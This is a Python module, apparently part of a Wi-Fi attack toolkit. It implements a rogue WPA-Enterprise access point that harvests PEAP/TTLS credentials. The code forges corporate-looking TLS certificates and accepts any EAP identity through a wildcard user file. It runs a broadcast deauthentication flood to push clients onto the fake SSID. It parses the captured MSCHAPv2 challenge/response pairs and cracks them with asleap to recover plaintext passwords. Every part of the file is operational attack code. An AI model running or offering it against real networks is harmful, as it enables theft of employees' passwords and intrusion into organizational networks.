"""Rogue Enterprise AP (hostapd-wpe) for PEAP/TTLS credential harvesting."""

import asyncio
import os
import shutil
from pathlib import Path

from core.exec_utils import run_command, validate_channel, spawn_with_retry
from core.hardware import start_monitor_mode, track_process
from core.models import save_result
from core.validation import sanitize_ssid
from core.display import console, info, ok, warn, err, header, StatusLine

CAPTURE_DIR = Path("captures")
EAP_USER_FILE = Path("/tmp/hostapd-wpe.eap_user")
CERT_DIR = Path("captures/enterprise_certs")


async def _generate_certs(common_name: str, organization: str) -> tuple:
    """Generate a fresh self-signed CA + server cert/key for hostapd-wpe.

    FIX: the original config pointed at Kali's bundled
    /etc/hostapd-wpe/certs/{ca,server}.pem — on a number of installs these
    are missing, placeholder, or fail to parse (ASN1_CHECK_TLEN errors),
    crashing hostapd-wpe with "Interface initialization failed" before it
    even starts. Generating our own valid cert chain at runtime sidesteps
    whatever state the system package's bundled certs are in.
    """
    CERT_DIR.mkdir(parents=True, exist_ok=True)
    ca_key = CERT_DIR / "ca.key"
    ca_crt = CERT_DIR / "ca.pem"
    server_key = CERT_DIR / "server.key"
    server_csr = CERT_DIR / "server.csr"
    server_crt = CERT_DIR / "server.pem"

    await run_command(["openssl", "genrsa", "-out", str(ca_key), "2048"])
    await run_command([
        "openssl", "req", "-x509", "-new", "-nodes", "-key", str(ca_key),
        "-sha256", "-days", "3650", "-out", str(ca_crt),
        "-subj", f"/CN={organization} Root CA/O={organization}/C=US",
    ])
    await run_command(["openssl", "genrsa", "-out", str(server_key), "2048"])
    await run_command([
        "openssl", "req", "-new", "-key", str(server_key), "-out", str(server_csr),
        "-subj", f"/CN={common_name}/O={organization}/C=US",
    ])
    await run_command([
        "openssl", "x509", "-req", "-in", str(server_csr), "-CA", str(ca_crt),
        "-CAkey", str(ca_key), "-CAcreateserial", "-out", str(server_crt),
        "-days", "825", "-sha256",
    ])
    return ca_crt, server_crt, server_key


async def _crack_with_asleap(username: str, challenge: str, response: str, wordlist: str):
    """Strip colons from hostapd-wpe's hex output and run asleap."""
    challenge_hex = challenge.replace(":", "").strip()
    response_hex = response.replace(":", "").strip()
    if not challenge_hex or not response_hex or not wordlist:
        return None
    try:
        proc = await asyncio.create_subprocess_exec(
            "asleap", "-C", challenge_hex, "-R", response_hex, "-W", wordlist,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()
        output = stdout.decode(errors="replace")
        for line in output.splitlines():
            if "password:" in line.lower():
                pw = line.split(":", 1)[1].strip()
                if pw:
                    return pw
    except Exception as e:
        warn(f"asleap error: {e}")
    return None


async def run_enterprise_attack(
    interface: str, ssid: str, channel: str, eap_type: str = "PEAP",
    common_name: str = "auth.company.local", organization: str = "Corporate IT Services",
    wordlist: str = "", deauth_interface: str = "",
) -> None:
    header("Rogue Enterprise AP (EAP Credential Harvest)")
    if not validate_channel(channel):
        err("Invalid channel"); return
    if not wordlist or not os.path.isfile(wordlist):
        err(f"Wordlist not found: {wordlist!r}"); return
    try:
        ssid = sanitize_ssid(ssid)
    except ValueError as e:
        err(str(e)); return

    if shutil.which("hostapd-wpe") is None:
        err("hostapd-wpe not found. Install with: sudo apt install hostapd-wpe"); return
    if shutil.which("asleap") is None:
        warn("asleap not found — captured hashes will be logged but not auto-cracked. Install with: sudo apt install asleap")

    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    if interface not in os.listdir("/sys/class/net"):
        err(f"Interface {interface} not found"); return

    # FIX: write the wildcard eap_user file so hostapd-wpe accepts ANY
    # username/EAP-type combination — without this it may only accept
    # identities listed in the system default file (or none at all).
    EAP_USER_FILE.write_text("*\tPEAP,TTLS\n")
    info(f"Wrote wildcard EAP user file: {EAP_USER_FILE}")

    info("Generating fresh TLS certificates for hostapd-wpe...")
    ca_crt, server_crt, server_key = await _generate_certs(common_name, organization)
    ok(f"Certs generated: {ca_crt}, {server_crt}")

    await run_command(["sudo", "ip", "link", "set", interface, "down"])
    await run_command(["sudo", "ip", "addr", "flush", "dev", interface])
    await run_command(["sudo", "ip", "addr", "add", "192.168.100.1/24", "dev", interface])
    await run_command(["sudo", "ip", "link", "set", interface, "up"])

    hostapd_conf = CAPTURE_DIR / f"enterprise_{ssid.replace(' ','_')}.conf"
    conf_lines = [
        f"interface={interface}", "driver=nl80211", f"ssid={ssid}",
        "hw_mode=g", f"channel={channel}", "auth_algs=1",
        "wpa=2", "wpa_key_mgmt=WPA-EAP", "ieee8021x=1", "eap_server=1",
        f"eap_user_file={EAP_USER_FILE}",
        f"ca_cert={ca_crt}",
        f"server_cert={server_crt}",
        f"private_key={server_key}",
    ]
    # FIX: differentiate PEAP vs TTLS config, matching the original behavior.
    if eap_type == "PEAP":
        conf_lines += ["eap_fast_a_id=101112131415161718191a1b1c1d1e1f", "wpa_pairwise=CCMP"]
    else:  # TTLS
        conf_lines += ["wpa_pairwise=CCMP"]
    hostapd_conf.write_text("\n".join(conf_lines) + "\n")

    dnsmasq_conf = CAPTURE_DIR / f"enterprise_dnsmasq_{ssid.replace(' ','_')}.conf"
    dnsmasq_conf.write_text(
        f"interface={interface}\n"
        f"dhcp-range=192.168.100.10,192.168.100.100,255.255.255.0,12h\n"
        f"dhcp-option=3,192.168.100.1\n"
        f"dhcp-option=6,8.8.8.8\n"
    )
    dnsmasq_proc = await asyncio.create_subprocess_exec(
        "sudo", "dnsmasq", "-C", str(dnsmasq_conf), "--no-daemon",
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
    )
    track_process(dnsmasq_proc)

    info(f"Starting rogue Enterprise AP '{ssid}' ({eap_type})  on {interface}...")
    proc, started, stderr_out = await spawn_with_retry(
        ["sudo", "hostapd-wpe", str(hostapd_conf)],
        check_seconds=2.0, max_attempts=2, retry_delay=2.0, label="hostapd-wpe",
    )
    if not started:
        if dnsmasq_proc.returncode is None:
            dnsmasq_proc.terminate()
        err(f"hostapd-wpe failed to start after retry. stderr:\n{stderr_out}")
        try:
            hostapd_conf.unlink()
        except Exception:
            pass
        return
    track_process(proc)
    ok("Rogue AP running. Waiting for EAP credential captures...")

    deauth_proc = None
    if deauth_interface and deauth_interface != interface:
        mon = await start_monitor_mode(deauth_interface)
        deauth_cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", "FF:FF:FF:FF:FF:FF", mon]
        try:
            deauth_proc = await asyncio.create_subprocess_exec(*deauth_cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
            track_process(deauth_proc)
            info(f"Broadcast deauth running on {mon} to push clients toward the rogue SSID")
        except Exception:
            pass

    # FIX: structured 3-line parse (username: / challenge: / response:) that
    # hostapd-wpe actually emits, matching the original web platform's parser.
    # The previous version only keyword-matched single lines and never
    # extracted a usable challenge/response pair, so asleap was never invoked.
    captured = []
    try:
        with StatusLine("Listening...") as status:
            while True:
                line = await proc.stdout.readline()
                if not line:
                    break
                decoded = line.decode(errors="replace").strip()
                if not decoded:
                    continue
                console.print(f"  [dim]{decoded}[/dim]")

                if "username:" in decoded.lower():
                    username = decoded.split(":", 1)[1].strip()
                    challenge_line = await proc.stdout.readline()
                    response_line = await proc.stdout.readline()
                    challenge_decoded = challenge_line.decode(errors="replace").strip()
                    response_decoded = response_line.decode(errors="replace").strip()
                    console.print(f"  [dim]{challenge_decoded}[/dim]")
                    console.print(f"  [dim]{response_decoded}[/dim]")

                    challenge = challenge_decoded.split(":", 1)[1].strip() if "challenge:" in challenge_decoded.lower() else ""
                    response = response_decoded.split(":", 1)[1].strip() if "response:" in response_decoded.lower() else ""

                    if username and challenge and response:
                        entry = {"username": username, "challenge": challenge, "response": response}
                        captured.append(entry)
                        ok(f"Credential set captured: {username}")
                        status.update(f"{len(captured)} credential set(s) captured")
                        save_result(f"ent_{len(captured)}", "enterprise", "", ssid,
                                    f"{username} (cracking...)", entry)

                        if shutil.which("asleap"):
                            info(f"Cracking with asleap for {username}...")
                            password = await _crack_with_asleap(username, challenge, response, wordlist)
                            if password:
                                ok(f"PASSWORD CRACKED: {username} : [bold green]{password}[/bold green]")
                                save_result(f"ent_{len(captured)}", "enterprise", "", ssid,
                                            f"{username}:{password}", entry)
    except (KeyboardInterrupt, asyncio.CancelledError):
        warn("Stopped by user.")
    finally:
        if proc.returncode is None:
            proc.terminate()
        if dnsmasq_proc.returncode is None:
            dnsmasq_proc.terminate()
        if deauth_proc and deauth_proc.returncode is None:
            deauth_proc.terminate()
        await run_command(["sudo", "ip", "addr", "flush", "dev", interface])
        for f in (hostapd_conf, dnsmasq_conf):
            try:
                f.unlink()
            except Exception:
                pass

    ok(f"Session complete — {len(captured)} credential set(s) captured.")
